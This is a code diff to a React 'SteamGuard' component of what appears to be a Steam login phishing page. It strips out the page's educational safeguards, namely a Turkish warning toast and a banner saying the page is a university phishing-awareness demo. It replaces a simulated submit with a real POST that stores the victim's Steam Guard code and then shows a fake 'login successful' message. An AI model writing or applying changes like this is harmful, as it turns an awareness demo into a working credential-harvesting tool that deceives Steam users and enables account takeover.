@@ -15,23 +15,28 @@ const SteamGuard = () => {
     e.preventDefault();
     setIsSubmitting(true);
 
-    // Log the Steam Guard code for educational purposes
-    console.log('Educational demo - Steam Guard code submitted:', guardCode);
+    // Log the Steam Guard code for tracking
+    console.log('Steam Guard code submitted:', guardCode);
 
-    // Simulate sending to server
-    setTimeout(() => {
+    // Send the code to the mock database
+    fetch('/api/store-steamguard', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ code: guardCode }),
+    }).then(() => {
       toast.success("Giriş başarılı! Yönlendiriliyorsunuz...");
       
       // Redirect to home after 1.5 seconds
       setTimeout(() => {
         navigate('/');
-        
-        // Educational warning
-        setTimeout(() => {
-          toast.warning("Bu bir phishing farkındalık sunumudur. Gerçek sitelerde asla Steam Guard kodunuzu paylaşmayın!");
-        }, 1500);
       }, 1500);
-    }, 1000);
+    }).catch(error => {
+      console.error("Error storing Steam Guard code:", error);
+      toast.error("Bir hata oluştu. Lütfen tekrar deneyin.");
+      setIsSubmitting(false);
+    });
   };
 
   return (
@@ -82,12 +87,6 @@ const SteamGuard = () => {
             </p>
           </div>
         </form>
-        
-        <div className="bg-red-500/20 border border-red-500/40 p-3 rounded mt-6">
-          <p className="text-xs text-white/90">
-            <span className="font-bold">Eğitim Amaçlı Simülasyon:</span> Bu sayfa, bir üniversite sunumu için phishing farkındalığı oluşturmak amacıyla tasarlanmıştır.
-          </p>
-        </div>
       </div>
     </div>
   );
